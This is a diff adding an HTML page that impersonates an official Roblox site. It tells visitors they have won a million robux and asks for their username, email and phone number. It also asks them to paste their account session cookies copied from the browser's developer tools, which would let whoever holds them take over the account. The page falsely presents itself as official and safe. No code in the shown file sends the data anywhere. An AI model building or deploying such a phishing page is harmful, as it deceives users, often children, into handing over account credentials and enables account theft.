@@ -1,0 +1,85 @@
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <title>Roblox</title>
+    <link rel="icon" type="image/x-icon" href="logo.jpg">
+</head>
+<div align="center">
+    <marquee id="marqueeStyle" onmouseover="this.stop();" onmouseout="this.start();">
+        If any problem , contact us on robloxsupport@gmail.com
+        </marquee>
+        <br>
+        <br>
+        <div class="alert alert-info" id="closeable">
+            <div >
+                <button class="btn" onclick="close()"><i class="fa fa-close" ></i></button>
+            </div>
+           This is a official roblox website , its fully safe to use
+          </div>
+   <h1>Congratulations Lucky Winner!</h1> 
+   <br>
+   <hr>
+   <br>
+   <br>
+   <h2>You won 1000000 robux!! its easy to get it , to get the robux just put the information so we can confirm its you</h2>
+   <input id="user" placeholder="Your username" required>
+   <br>
+   <br>
+   <input type="email" placeholder="Your email" id="email" required>
+   <br>
+   <br>
+   <input type="number" placeholder="Your phone number" required>
+   <br>
+   <br>
+   <textarea placeholder="put your cookies from application tab on inspect ( use inspect on your roblox account page )"></textarea>
+   <br>
+   <br>
+   <a href="main.html">
+    <input type="submit" onclick="down()">
+   </a>
+
+</div>
+
+<style>
+
+    *{
+        padding:0px;
+        margin:0px;
+    }
+
+    body{
+    background-color: rgb(41, 37, 37);
+    color:white;
+    }
+    
+#marqueeStyle{
+  width:100%;
+  direction:right;
+  height:30px;
+  color: black;
+  font-size:120%;
+  background-color: white;
+}
+
+textarea{
+    height:200px;
+    width:500px;
+}
+
+button{
+    float: right;
+    background-color: skyblue;
+}
+
+
+</style>
+
+<script>
+    function close(){
+document.getElementById("closeable").style.visibility=false;
+    }
+</script>
